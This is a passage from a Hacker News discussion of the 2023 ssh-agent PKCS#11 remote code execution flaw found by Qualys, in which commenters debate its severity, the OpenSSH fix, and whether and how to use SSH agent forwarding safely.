libreoffice/program/libscriptframe.so (groom)     x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so (groom)     x86_64-linux-gnu/libxkbregistry.so.0.0.0 (groom)     debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug (SIGBUS)  ``` The paper goes on to classify like 4 more patterns whereby you can get unexpected control transfers by dlopen() and immediately dlclosing() libraries. The kicker: ```     we noticed that one shared library's constructor function     (which can be invoked by a remote attacker via an ssh-agent forwarding)     starts a server thread that listens on a TCP port, and we discovered a     remotely exploitable vulnerability (a heap-based buffer overflow) in     this server's implementation. ``` | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [jeffbee](user?id=jeffbee) [on July 20, 2023](item?id=36796888)   | [parent](#36792299) | [next](#36796539) [–]  This is pretty wild, but if anyone had asked me previously "should the SSH agent be allowed to dlopen anything?" I would have said "no". It really seems like for something this sensitive, running it in an empty namespace with no abilities of any kind, unless or until those abilities prove necessary, would be a good approach for those who have high security requirements. If I know I am going to use a smartcard, then I can make the PKCS library visible inside the agent's sandbox. But I can see no reason why I would have given it access to libsane, or whatever libenca is, or any other library for that matter. | | --- | --- | --- | | | |  |  | [fsckboy](user?id=fsckboy) [on July 20, 2023](item?id=36796927)   | [root](#36792299) | [parent](#36796888) | [next](#36796539) [–]  and i quote: Enca is an Extremely Naive Charset Analyser. It detects character set and encoding of text files and can also convert them to other encodings using either a built-in converter or external libraries and tools like libiconv, librecode, or cstocs. Currently, it has support for Belarussian, Bulgarian, Croatian, Czech, Estonian, Latvian, Lithuanian, Polish, Russian, Slovak, Slovene, Ukrainian, Chinese and some multibyte encodings (mostly variants of Unicode) independent on the language. This package also contains shared Enca library other programs can make use of. Install enca if you need to cope with text files of dubious origin and unknown encoding and convert them to some reasonable encoding. | | --- | --- | --- | | | |  |  | [hulitu](user?id=hulitu) [on July 20, 2023](item?id=36797360)   | [root](#36792299) | [parent](#36796927) | [next](#36796539) [–]  > Install enca if you need to cope with text files of dubious origin and unknown encoding and convert them to some reasonable encoding. Install enca if you want an exploit. As far as i remember Pegasus also took advantage of parsing "files of dubious origin and unknown encoding". | | --- | --- | --- | | | |  |  | [brasic](user?id=brasic) [on July 20, 2023](item?id=36796539)   | [parent](#36792299) | [prev](#36796888) | [next](#36795944) [–]  How would this even be mitigated while preserving the (wacky) existing support for runtime-selected PKCS#11 provider libraries? It strikes me that the most compatible way might be to double down on the wackiness and try to perform the required feature detection in some more indirect way like parsing the named lib with readelf(1) or the platform equivalent. The sensible thing would be to force users to register available provider shared libraries in an ssh-agent config file, but that feels like a pretty big breaking change. Edit: Didn’t realize a patch was already available. I see that they did in fact fix this with a breaking change, by simply disabling the functionality by default, and recommending that users allowlist their specific libraries: ```   Potentially-incompatible changes   --------------------------------       * ssh-agent(8): the agent will now refuse requests to load PKCS#11      modules issued by remote clients by default. A flag has been added      to restore the previous behaviour "-Oallow-remote-pkcs11"  ``` <https://www.openssh.com/releasenotes.html#9.3p2> | | --- | --- | --- | | | |  |  | [pjmlp](user?id=pjmlp) [on July 20, 2023](item?id=36797733)   | [root](#36792299) | [parent](#36796539) | [next](#36796580) [–]  By finally acknowledging that loading plugins via shared objects is a bad idea, and it was only valuable in the days of resource constrained computers. Any application that wants to use plugins and is security sensitive, should adopt OS IPC, and load them as separate processes. | | --- | --- | --- | | | |  |  | [brasic](user?id=brasic) [on July 20, 2023](item?id=36801030)   | [root](#36792299) | [parent](#36797733) | [next](#36797877) [–]  Process separation was already in place. The PKCS#11 library is loaded by a long lived helper process, not ssh-agent itself. ```   > (Note to the curious readers: for security reasons, and as explained in   > the "Background" section below, ssh-agent does not actually load such a   > shared library in its own address space (where private keys are stored),   > but in a separate, dedicated process, ssh-pkcs11-helper.)   ``` That didn’t help because the long lived nature of the helper process exposed it to the shared lib side effects such that they could be chained into a gadget. If I understand correctly, the long life is important for interacting with many smart cards and HSMs because of *their* APIs. If you are suggesting that there should be an IPC API for this process and vendors ship a full program that speaks it, that seems reasonable at a glance, but not really something the OpenSSH project can dictate. | | --- | --- | --- | | | |  |  | [pjmlp](user?id=pjmlp) [on July 20, 2023](item?id=36802790)   | [root](#36792299) | [parent](#36801030) | [next](#36797877) [–]  Indeed, my suggestion is zero dynamic libraries in security critical code/applications. If security is a goal, loading in-process foreign code is already a lost battle. Plugins as dynamic libraries made sense when we were fighting for each MB, not when people have hardware where they go to the extreme of running containers for every application they can think of. Bonus, processes aren't as heavy as containers. | | --- | --- | --- | | | |  |  | [eptcyka](user?id=eptcyka) [on July 20, 2023](item?id=36797877)   | [root](#36792299) | [parent](#36797733) | [prev](#36801030) | [next](#36796580) [–]  Would IPC help if a remote attacker was still allowed to execute arbitrary plugins? | | --- | --- | --- | | | |  |  | [pjmlp](user?id=pjmlp) [on July 20, 2023](item?id=36798125)   | [root](#36792299) | [parent](#36797877) | [next](#36796580) [–]  It would help against attacks that depend on corrupting process address space, like this one. Additionally, one could use OS security features to reduce API surface for each plugin, depending on what they are actually supposed to be doing, e.g. no need for file system access if they only do in-memory data processing. As for "would it help in 100% of the attacks?", no. Even if there were no plugins support, there is still the possibility to exploit logical errors anyway. What matters is having a balance between reducing attack surface, and application features, and it than regard process sandboxing is much safer than loading foreign code in-process. | | --- | --- | --- | | | |  |  | [viraptor](user?id=viraptor) [on July 20, 2023](item?id=36796580)   | [root](#36792299) | [parent](#36796539) | [prev](#36797733) | [next](#36795944) [–]  > How would this even be mitigated while preserving the (wacky) existing support for runtime-selected PKCS#11 provider libraries? Put the pkcs11 libraries in a specific directory, configure only that directory, let users manually add others. Or stop using forwarding and configure ProxyJump where needed. (If that's the only use case you're interested in) | | --- | --- | --- | | | |  |  | [tlb](user?id=tlb) [on July 20, 2023](item?id=36795944)   | [parent](#36792299) | [prev](#36796539) | [next](#36798205) [–]  It's a very impressive exploit. But I wonder if the PoC||GTFO maxim for security researchers leads to a lot of wasted effort. I was convinced that ssh-agent needed fixing as soon as they pointed out that it (a) accepts the name of a shared library within /usr/lib to dlopen over the network and (b) the range of crazy things that standard shared libraries do. Did they need to do all the extra work of developing an exploit in order to convince someone that was dangerous? | | --- | --- | --- | | | |  |  | [tptacek](user?id=tptacek) [on July 20, 2023](item?id=36796106)   | [root](#36792299) | [parent](#36795944) | [next](#36797522) [–]  That's a great question. I think the answer is: no. They probably agree. I think, like, 80% of this is just art. There's a notion of fleshing out the constructor/destructor attack surface, which someone on Mastodon pointed out was pretty similar to how deserialization exploits work (they're chains of classes you can only instantiate and not directly invoke methods on), but this might be the only time this particular variety of attack ever happens again. It's funny reading this thread full of people saying the attack is not that big a deal. It's a really big deal! It's just not a big deal for the reason people assume vulnerabilities are a big deal. :) | | --- | --- | --- | | | |  |  | [funcDropShadow](user?id=funcDropShadow) [on July 20, 2023](item?id=36797522)   | [root](#36792299) | [parent](#36795944) | [prev](#36796106) | [next](#36798862) [–]  > Did they need to do all the extra work of developing an exploit in order to convince someone that was dangerous? It might be clear in this case for someone who has already seen that really obscure bugs could be practically misused. But in the long-term, it is necessary to show that this is not some theoretical risk, which could be exploited in one never-heard-of hobby linux distribution. If security researchers skip these PoCs, a generation of future developers - who never saw practical PoCs - will just not believe it is relevant. Saying the security researchers don't need to show PoCs is like saying mathematicians don't need proof, they just need to be very sure that a theorem holds. That is the difference between a researcher/scientist and an engineer. An engineer could say, well this is likely exploitable, therefore let's safeguard against this. So that there remains a margin of security. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [on July 20, 2023](item?id=36798862)   | [root](#36792299) | [parent](#36795944) | [prev](#36797522) | [next](#36798205) [–]  My guess is that without the PoC you will too often run into somebody who insists that in practice it's fine. Not always, but maybe it's one time in five. And now you've been told it's "fine" and so you should meekly go away right? As I understand it that TOCTOU race in Rust's std::fs::remove\_dir\_all had been reported once before and just not accepted as a security bug. The C++ libraries have the excuse that WG21 decided this is all UB anyway and so they weren't required to fix the equivalent bug in their standard library, but in Rust the answer is that sometimes when you raise a real concern somebody says it's fine, erroneously. It's not like OpenSSH did this by accident. They did this on purpose and they apparently thought it was reasonable when they did it, so if it's supposedly obvious that it's a problem, why is it in the design? | | --- | --- | --- | | | |  |  | [zwp](user?id=zwp) [on July 20, 2023](item?id=36798205)   | [parent](#36792299) | [prev](#36795944) | [next](#36806206) [–]  Tangential question: there is one reason to use NODELETE in the dlopen(3) man page: <https://man7.org/linux/man-pages/man3/dlopen.3.html> ```   RTLD_NODELETE (since glibc 2.2)     Do not unload the shared object during dlclose().     Consequently, the object's static and global variables     are not reinitialized if the object is reloaded with     dlopen() at a later time.  ``` Are there any other times when it's beneficial to use NODELETE? | | --- | --- | --- | | | |  |  | [fweimer](user?id=fweimer) [on July 20, 2023](item?id=36798542)   | [root](#36792299) | [parent](#36798205) | [next](#36800929) [–]  You mean as opposed to never calling dlclose to the handle? If you specify RTLD\_NODELETE, the dynamic linker can avoid some dependency tracking that would otherwise be needed to avoid premature unloading of the object because that unloading can never happen. However, the main application of NODELETE is the DF\_1\_NODELETE flag in the shared object itself. A typical use case is if the shared object installs a function pointer somewhere where it cannot be reverted as part of the dlclose operation. If the dlclose proceeds despite this, calling the function later will have hard-to-diagnose, unpredictable consequences. Rather than relying on dlclose never being called (which is difficult because the object might have been loaded as an indirect dependency, unaware to the caller of dlopen), using the DF\_1\_NODELETE flag makes this explicit. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [on July 20, 2023](item?id=36800929)   | [root](#36792299) | [parent](#36798205) | [prev](#36798542) | [next](#36806206) [–]  It's not really possible to safely unmap code in a library in the presence of various other useful features you might like to use, specifically thread-local storage, atfork, callbacks (and probably threads in general). Libvirt started to use this flag over a decade ago: [https://libvir-list.redhat.narkive.com/TUbaBTsk/libvirt-patc...](https://libvir-list.redhat.narkive.com/TUbaBTsk/libvirt-patch-prevent-crash-from-dlclose-of-libvirt-so) | | --- | --- | --- | | | |  |  | [hinkley](user?id=hinkley) [on July 20, 2023](item?id=36806206)   | [parent](#36792299) | [prev](#36798205) | [next](#36798367) [–]  Years ago, and in fact as I was coming off of a security-related job, I had the notion that we should map out decisions as a first class citizen of the development cycle, instead of or in addition to requirements (requirements are just one sort of decision). The problem with unexpected behavior is often a matter of Chesterton's Fence. We know something was done on purpose, we can't remember why, and so we break the constraint with crossed fingers and an uneasy feeling. If we tracked why we did things, which ideas supported which other ideas, which ideas complicated other ideas, maybe we would spot these sorts of things, and also the contradictions we try to put into the code. What ended up souring me on the whole idea was realizing this would be a wonderful Blame Allocation System, by attaching names to decisions. It's been a while since I went from full enthusiasm to creeping dread so fast on a product idea, and probably not since. | | --- | --- | --- | | | |  |  | [themoonisachees](user?id=themoonisachees) [on July 20, 2023](item?id=36798367)   | [parent](#36792299) | [prev](#36806206) | [next](#36828161) [–]  Regarding the kicker: The library that does this is DisplayDoc, a library that you LD\_PRELOAD in a process you want to debug, and it opens a socket that the rest of the program connects to, enabling you to debug the graphics stack. Sure it's not exactly best practices but it's not entirely unreasonable for this library to do this. They've since patched the various bugs that qualys discovered. | | --- | --- | --- | | | |  |  | [tptacek](user?id=tptacek) [on July 20, 2023](item?id=36804166)   | [root](#36792299) | [parent](#36798367) | [next](#36828161) [–]  Oh, it's absolutely not the library's fault; nobody could reasonably have expected that "random privileged code is going to dlopen your library at random times" was part of the threat model. | | --- | --- | --- | | | |  |  | [nenaoki](user?id=nenaoki) [on July 22, 2023](item?id=36828161)   | [parent](#36792299) | [prev](#36798367) | [next](#36791441) [–]  >This is the bug of the year. Don't forget to knock on wood. | | --- | --- | --- | | | |  |  | [sullivanmatt](user?id=sullivanmatt) [on July 19, 2023](item?id=36791441)   | [prev](#36792299) | [next](#36790649) [–]  This sounds way worse than it is. To be clear, the "remote" part of the code execution is that an attacker controlling your destination server can cause your *client* to run an attacker-controlled payload, *if* the client is forwarding their credentials (`ssh -A`). Most people don't tend to make connections to arbitrary SSH hosts, and certainly they don't do it while forwarding their credentials along. It's a neat attack, and I applaud the Qualys team on their find, but this is not any sort of emergency situation for 99.99% of systems. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36794497)   | [parent](#36791441) | [next](#36792352) [–]  I beg to differ: this does *not* sound way worse than it is. If anything, it's understating the issue. Not only can it be exploited across a wide variety of clients across multiple platforms, but all that's required is that you're using key forwarding. This is devastating, because it's not just that you control the destination server and steal the keys, but you can take over the user's entire workstation. Once you've got the user's entire workstation, you potentially have access to everything else they have, from their email, to other SSH hosts, to key loggers, to Git repos. This is about as bad as it gets, and all because someone is using Agent Forwarding. Best of all, the victim has *no idea* that they've been completely compromised. They can live inside your machine for years, upgrade their sploits, and generally exfiltrate all of your secrets. Never use agent forwarding. Just don't. "Agent forwarding should be enabled with caution" in the man page is another massive understatement. Even if you *think* you need it, check the other responses in this thread for examples of how to work around it. | | --- | --- | --- | | | |  |  | [dumpsterdiver](user?id=dumpsterdiver) [on July 19, 2023](item?id=36794702)   | [root](#36791441) | [parent](#36794497) | [next](#36799093) [–]  > Never use agent forwarding Agreed. As this exploit proves, it's not even safe to log into your own servers using ssh forwarding if any service is exposed remotely, because if an attacker compromises that exposed service and gains root then they could extend the attack to your workstation, and that's a huge deal - especially considering that you have the private key to log into that server on your computer (so it's not an unsafe bet there might be other keys). | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 20, 2023](item?id=36802994)   | [root](#36791441) | [parent](#36794702) | [next](#36799093) [–]  Exactly - agent forwarding is the laziest and fastest path to getting severely *pwn*ed, but the irony is that the alternatives are actually fairly simple and fast, if someone is willing to take the time to adjust their process a little bit. | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36808413)   | [root](#36791441) | [parent](#36802994) | [next](#36799093) [–]  > agent forwarding is the laziest and fastest path to getting severely pwned Only for people who don't know what they are doing. Usually, such people also make poor replacement decisions that are even less secure. > the alternatives are actually fairly simple and fast, if someone is willing to take the time to adjust their process a little bit. I often need to work on code in ephemeral containers. Is there an "actually fairly simple and fast" method I can use to be able git pull and push to and from these ephemeral containers that: 1. doesn't require too much adjustment (a little bit is okay); and 2. is not less secure than agent forwarding with confirmation? | | --- | --- | --- | | | |  |  | [dumpsterdiver](user?id=dumpsterdiver) [on July 21, 2023](item?id=36808989)   | [root](#36791441) | [parent](#36808413) | [next](#36799093) [–]  > Only for people who don't know what they are doing. By that do you just mean that no services are openly exposed on the system? To my understanding, if any vulnerable service is remotely exposed then it's not at all safe to use agent forwarding with the affected version of openssh. | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 21, 2023](item?id=36809732)   | [root](#36791441) | [parent](#36808989) | [next](#36799093) [–]  By that I mean to use the now-20-year-old 'ssh-add -c' flag. It'd seem practically no one is aware that an ssh agent does NOT have to silently and automatically sign just any and every auth request, given just how frequently I see people decrying "No! If you forward your agent that means a remote host has full access to everything in your agent! Never forward your agent ever! No buts!" With the '-c' flag, if a remote host tries to use my agent, I get a graphical dialog on my local machine asking me if I want to let my agent do it. If I'm not expecting the dialog, I can just say no, and now I know the remote is compromised. Actually, I go a step further. Because it is possible to accidentally accept a signing request by pressing the enter key that I meant to press for sth else, I make my agent require a passphrase on every use, not just a yes/no dialog. In checking my machines for this CVE, I discovered my agent has yet another layer of security built-in. I use gpg-agent, relying on its famed security posture. Turns out, when forwarded, gpg-agent supports nothing except signing. It does not support adding keys from a remote, let alone fancy operations like loading a PKCS11 provider chosen by a remote. ---- Securing a forwarded agent has nothing to do with whether there are openly exposed services on a remote system. The remote system could have malicious code that entered it not necessarily through an exposed service. A compromised npm package in the supply chain, for instance, is sufficient. It doesn't matter how it got there. What matters is: when it does, can it abuse a forwarded agent. Hence the '-c' flag to ssh-add. | | --- | --- | --- | | | |  |  | [dumpsterdiver](user?id=dumpsterdiver) [on July 21, 2023](item?id=36809860)   | [root](#36791441) | [parent](#36809732) | [next](#36799093) [–]  I was not aware of that functionality in ssh-add. Thank you! Man page reference: "-c Indicates that added identities should be subject to confirmation before being used for authentication. Confirmation is performed by ssh-askpass(1). Successful confirmation is signaled by a zero exit status from ssh-askpass(1), rather than text entered into the requester." Edit: After thinking about it more, I think I may have misunderstood how the -c parameter would perform in regards to this CVE. Would a confirmation prompt actually suffice to prevent this attack? Also, it begs the question, does this exploit rely upon someone *already* forwarding to a malicious server? I've only read the CVE, and skimmed the reporter's blog, so I don't know with certainty one way or the other. If the exploit does require that the forwarding has already taken place, -c couldn't really help, right? The decision was made to allow it. I hope I'm not sounding contrarian, I'm genuinely curious about how this would play out. | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 21, 2023](item?id=36812244)   | [root](#36791441) | [parent](#36809860) | [next](#36799093) [–]  The '-c' is not a mitigation to this CVE. It is a mitigation to a malicious remote silently opening further ssh connections to other servers you have access to. My parent claimed that using agent forwarding is always insecure. Judging by their response to my comments elsewhere in this discussion, they seem to be under the impression that a forwarded agent will always silently and automatically sign auth requests. And yes, if you forward an agent with a key in it that's missing the '-c' flag, it will. Ignorance of the confirmation feature is classifiable under 'you don't know what you're doing'. The same parent has also been beating their drum of 'create keypairs on remote servers' pretty heavily in many places in this discussion. That \_is\_ less secure than a forwarded agent that confirms each use. ---- I do not claim anywhere that the '-c' flag prevents this CVE from being exploited. It's just that the agent I happened to be using — gpg-agent instead of ssh-agent — just happened to be immune to this CVE by doing what OpenSSH has decided to do in response to this CVE. I.e., I blindly relied on gpg-agent to be secure and it paid off here. ---- > ... the forwarding has already taken place, -c couldn't really help, right? The decision was made to allow it. It's not a confirmation of "Do you want to forward this agent?". It's a confirmation of "Do you want to sign a request using this key?". That happens in every auth request. So if you ssh into foo, you'd get a dialog to confirm the use of your private key for this initial ssh. This is not added security, just an extra step in the initial ssh process. But if you try to ssh into bar from foo, then you'd get another dialog on your local machine to confirm the use of your private key for the auth request by bar. \_This\_ is the added security vs. malicious code on foo ssh-ing into bar as you without your knowledge. | | --- | --- | --- | | | |  |  | [e12e](user?id=e12e) [on July 20, 2023](item?id=36799093)   | [root](#36791441) | [parent](#36794497) | [prev](#36794702) | [next](#36799993) [–]  > Never use agent forwarding. Just to add to this, with the new -J/ProxyJump directive, it's become (even) easier to login through a ssh host without needing to enable agent forwarding (Given that you're connecting through a not-ancient host running a reasonable version of openssh - beware of firewall/appliances stuck on ancient sshd and/or proprietary/"mini" versions). | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36799993)   | [root](#36791441) | [parent](#36794497) | [prev](#36799093) | [next](#36792352) [–]  Agent Forwarding is not a trivial thing to take lightly, but a knee-jerk reaction "ban it entirely" is too much. I forward my agent by default because I've set it up securely. My setup is safe from this exploit too (I use gpg-agent as my SSH Agent). In return I get the seamless convenience I cannot get through any other method. Jump hosts are fine (and I use them too) but there is no way I'd be able to do remote git operations in ephemeral dev containers without the peace of mind (and safety) that agent forwarding gives me. Creating keys on remote dev envs for git operations is \_less\_ secure than agent forwarding, even when those keys are encrypted (passphrase protected) at rest, because they have to be loaded into memory on the (potentially compromised) remote host. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 20, 2023](item?id=36802967)   | [root](#36791441) | [parent](#36799993) | [next](#36792352) [–]  > Creating keys on remote dev envs for git operations is \_less\_ secure than agent forwarding, even when those keys are encrypted (passphrase protected) at rest, because they have to be loaded into memory on the (potentially compromised) remote host. That's not how agent forwarding works. An attacker on the remote server can piggyback on your SSH session and do anything else desired, so your remote git repo is still compromised, but the blast radius of these remote keys is much smaller. (in infosec, we'd usually call this least privilege but separation of duties also applies) All of this is still possible even with gpg-agent, even if this particular RCE doesn't apply to you, so "Never Use Agent Forwarding" still applies. | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36808375)   | [root](#36791441) | [parent](#36802967) | [next](#36792352) [–]  > An attacker on the remote server can piggyback on your SSH session and do anything else desired This myth is about 20 years out of date. See what the '-c' flag for ssh-add does. It was added in OpenSSH 3.6 back in 2003. In fact, I can prove it to you. Take my pubkey from GitHub (same username) and put it on a host you control. Tell me to ssh into it with my agent forwarded and see if that gives you access to my GitHub account. ---- > All of this is still possible even with gpg-agent Even without the 'confirm each use' flag, gpg-agent with a zero TTL visually asks for the decryption key on each use. There \_are\_ some agents out there that have no support for visual confirmations and yet happily accept the '-c' flag (looking at you, GNOME), but gpg-agent isn't one of them. ---- > That's not how agent forwarding works You seem to be misreading. I'm not claiming that's how agent forwarding works. I'm saying that's how your suggestion of creating a keypair on a remote host works. It \_is\_ less secure because it requires those keys to be resident on the remote. If the remote is compromised, decrypting the key in the compromised machine's memory is strictly insecure compared to doing it on my local machine with an agent. Once captured from the compromised remote, those keys can be exfiltrated and used repeatedly. But, if an agent is somehow tricked into signing an unauthorised request, that access is still limited to one use only. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 21, 2023](item?id=36819053)   | [root](#36791441) | [parent](#36808375) | [next](#36792352) [–]  >> > An attacker on the remote server can piggyback on your SSH session and do anything else desired > This myth is about 20 years out of date. This hole didn't simply disappear when -c was added. The vulnerability is simply that the socket file containing the connection *back to your agent* is accessible by anyone who managed to escalate to root on the remote host. You're making several assumptions: #1: someone is using -c #2: that -c even does anything on their platform #3: the user pays attention to them and is untrickable #4: there are no bugs in the ssh-agent or gpg-agent on the client machine Any one of these being false renders all protection from -c moot; worse yet, a bug in the ssh-agent (or gpg-agent, if that's your poison) like the one in the subject of this post can be leveraged into complete client takeover. > Once captured from the compromised remote, those keys can be exfiltrated and used repeatedly. that is true, which is why they should be tightly scoped. > But, if an agent is somehow tricked into signing an unauthorised request, that access is still limited to one use only. That one use only is all that is needed. An attacker might install another pubkey, start up another socket process, or even rootkit the remote box if you have sudo, doas or if there are any privilege escalation vulns. These situations are identical in that the remote box is pwned, but only one of these tries to limit the exploits to just that one remote box and not every other host your keys have access to. | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 21, 2023](item?id=36820309)   | [root](#36791441) | [parent](#36819053) | [next](#36792352) [–]  > This hole didn't simply disappear when -c was added. The vulnerability is simply that ... Why are you conflating the two? You're making claims that sth has always been utterly, completely broken, and the only evidence you can cite for it is sth that was revealed to the world a few days ago? This CVE is a secvuln. No one is arguing against that. Secvulns happen. No software is bug-free. Does that mean every software everywhere is suddenly utterly completely broken? Actually, while we are on the topic, why not argue banning SSH entirely. After all, each SSH connection is a connection back to the host where the `ssh` client runs. Tomorrow, there could be a secvuln discovered in the `ssh` binary that can be exploited by simply printing the right characters to stdout. In fact, this very vector has been used before to pwn vulnerable terminal emulators, even over ssh. ---- > ... which is why they should be tightly scoped. As can forwarded agents (see 'IdentityAgent' in `man ssh\_config`). In fact, this is how I separate client projects from each other and my personal projects. (I didn't do it for security, rather for the convenience of not tripping any 'max keys allowed' limits, but hey, I'll take the security benefit too!) ---- > That one use only is all that is needed. ... tries to limit the exploits to just that one remote box and not every other host your keys have access to. You're making several assumptions: #1: someone is disciplined enough to use tightly scoped keys #2: that they bother to rotate all those ephemeral keys without fail #3: that the sheer inconvenience of constantly updating keys doesn't bother them enough to say 'screw this!' Guess what the weakest link is when it comes to computer security? The human factor. You're asking humans to go through way too much hassle they're not going to care about. Which means they'll voluntarily break the security of the system without care (and, of course, without understanding). You also forget that: 1. Agents can be scoped too. 2. Jumpboxes are often used to jump to a large number (most often, all) of servers. No organization is going around creating point-to-point jump links between servers or dedicating a separate jumpbox for every destination server. 3. Your model, when exploited, gives the attacker repeatable, lasting access. You say, "That one use only is all that is needed", and you're correct, but only for the most determined and prepared attackers. Once-only accidental access is better than repeatable lasting access for the simple fact that most attackers are aiming for only the latter. 4. Your model is also more susceptible to silent persistent malware. My method has the benefit that exploited remotes are discovered before the exploit is given lateral movement access. ---- > ... who managed to escalate to root on the remote host. No root needed. DAC enough. I say this because I run untrusted code in VMs/containers I ssh into, with my agent forwarded. And I consider arbitrary npm/python/etc. packages automatically untrusted. | | --- | --- | --- | | | |  |  | [justsomeadvice0](user?id=justsomeadvice0) [on July 19, 2023](item?id=36792352)   | [parent](#36791441) | [prev](#36794497) | [next](#36791957) [–]  Lots of people end up with AgentForward on by default as a sort of "make it work" fix, and lots of people use `git+ssh` on untrusted servers. Here's an example: [https://abyssdomain.expert/@filippo/109659699817863532](https://abyssdomain.expert/%40filippo/109659699817863532) TBF this is a vulnerable config either way; but RCE on the client shouldn't be possible. | | --- | --- | --- | | | |  |  | [doubled112](user?id=doubled112) [on July 20, 2023](item?id=36795479)   | [root](#36791441) | [parent](#36792352) | [next](#36792640) [–]  I've been using a separate SSH config for git for a long time now. Nice to see it wasn't just paranoia. Among the settings are explicitly disabling agent forwarding, and using a git specific identity (SSH key). | | --- | --- | --- | | | |  |  | [tinus\_hn](user?id=tinus_hn) [on July 19, 2023](item?id=36792640)   | [root](#36791441) | [parent](#36792352) | [prev](#36795479) | [next](#36791957) [–]  I’m not so sure git is secure against a malicious server, even if you’re not simply pulling in a Makefile written by the attacker. | | --- | --- | --- | | | |  |  | [themoonisachees](user?id=themoonisachees) [on July 20, 2023](item?id=36798396)   | [root](#36791441) | [parent](#36792640) | [next](#36791957) [–]  Assuming you do perfect integrity checks of the git repo you're pulling, git uses SSH and obeys ssh config for each hosts under the hood. It's safe to say that if you have forward-agent enabled git is vulnerable. | | --- | --- | --- | | | |  |  | [TechBro8615](user?id=TechBro8615) [on July 19, 2023](item?id=36791957)   | [parent](#36791441) | [prev](#36792352) | [next](#36797014) [–]  The attacker controlled destination server could be a compromised host, so this enables lateral movement from a deployed VM or remote dev machine into a developer laptop. | | --- | --- | --- | | | |  |  | [ivlad](user?id=ivlad) [on July 20, 2023](item?id=36797014)   | [parent](#36791441) | [prev](#36791957) | [next](#36791776) [–]  “git pull” over SSH and have your system RCEd? I’d say it levels above “neat”. | | --- | --- | --- | | | |  |  | [franga2000](user?id=franga2000) [on July 20, 2023](item?id=36798169)   | [root](#36791441) | [parent](#36797014) | [next](#36791776) [–]  You'd need to go out of your way to make git pull do agent forwarding and I can't really think of a reason why anyone would. | | --- | --- | --- | | | |  |  | [e28eta](user?id=e28eta) [on July 19, 2023](item?id=36791776)   | [parent](#36791441) | [prev](#36797014) | [next](#36791501) [–]  I don’t know how prevalent it is as a network architecture, but it seems like a bastion host / jump box would be a juicy target for this exploit, since it’d let the attacker jump upstream. | | --- | --- | --- | | | |  |  | [jmalicki](user?id=jmalicki) [on July 19, 2023](item?id=36791920)   | [root](#36791441) | [parent](#36791776) | [next](#36791923) [–]  Sure, but first they have to root the bastion box. If you root the bastion box, you have user credentials for anything inside the network. Controlling the user's laptop seems unlikely to be your most profitable next step. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792996)   | [root](#36791441) | [parent](#36791920) | [next](#36792584) [–]  > If you root the bastion box, you have user credentials for anything inside the network. But that's not how a (properly-configured!) bastion host works. You won't have user credentials for anything UNLESS users are using Forward Agent (which they shouldn't! simplest explanation here.. <https://userify.com/docs/jumpbox> ). That's the point behind using ProxyJump. Your connection actually jumps THROUGH the bastion box and doesn't stop for interception along the way. (And, of course, an attacker can't do anything very useful with ssh public keys except for maybe traffic analysis or learning more target IP's.) | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [on July 19, 2023](item?id=36792584)   | [root](#36791441) | [parent](#36791920) | [prev](#36792996) | [next](#36791923) [–]  It really depends on the setup; ex. I imagine it's easier to steal company code from a laptop than server, while data is the other way around. | | --- | --- | --- | | | |  |  | [akerl\_](user?id=akerl_) [on July 19, 2023](item?id=36791923)   | [root](#36791441) | [parent](#36791776) | [prev](#36791920) | [next](#36791501) [–]  Increasingly, the role of a bastion host is served either by something like Teleport, which handles authn/z and proxying without needing forwarded agents, or newer options in OpenSSH like ProxyJump where you hop via a bastion host but without ever forwarding your agent. | | --- | --- | --- | | | |  |  | [malux85](user?id=malux85) [on July 19, 2023](item?id=36791501)   | [parent](#36791441) | [prev](#36791776) | [next](#36798170) [–]  Yeah if I’m reading the technical analysis right, your conditions that you mention have to be correct and also the attacker must have “poisoned” library files on the targets machine so they can dlopen them, is that right? Pretty unlikely | | --- | --- | --- | | | |  |  | [Arnavion](user?id=Arnavion) [on July 19, 2023](item?id=36791706)   | [root](#36791441) | [parent](#36791501) | [next](#36791545) [–]  The libraries are on the client's machine, not the server's. And they're not "poisoned"; the default distro-provided libs already provide the remote execution capabiity (eclipse-titan, libkf5sonnetui5, libns3-3v5 and systemd-boot packages from Ubuntu 22.04). | | --- | --- | --- | | | |  |  | [malux85](user?id=malux85) [on July 19, 2023](item?id=36792330)   | [root](#36791441) | [parent](#36791706) | [next](#36791545) [–]  Ahh I see I thought the attacker also had to have custom malicious libs deployed on the client machine I wasn't sure if standard ones would do, thanks for clarifying that | | --- | --- | --- | | | |  |  | [sullivanmatt](user?id=sullivanmatt) [on July 19, 2023](item?id=36791545)   | [root](#36791441) | [parent](#36791501) | [prev](#36791706) | [next](#36798170) [–]  There must be a specific set of libs present on the victim (client), correct. Qualys claims that stock Ubuntu Desktop systems often have these libs, and that they haven't looked into whether other distros tend to. But yes, your point stands. Huge number of preconditions here to fulfill. | | --- | --- | --- | | | |  |  | [paulmd](user?id=paulmd) [on July 20, 2023](item?id=36798170)   | [parent](#36791441) | [prev](#36791501) | [next](#36793804) [–]  Are you saying that if you SFTP in to a client machine to upload a file to their server, it’s expected behavior that you’re willing to give them root on your machine? | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36793804)   | [parent](#36791441) | [prev](#36798170) | [next](#36790649) [–]  Aren't all SSH hosts potentially 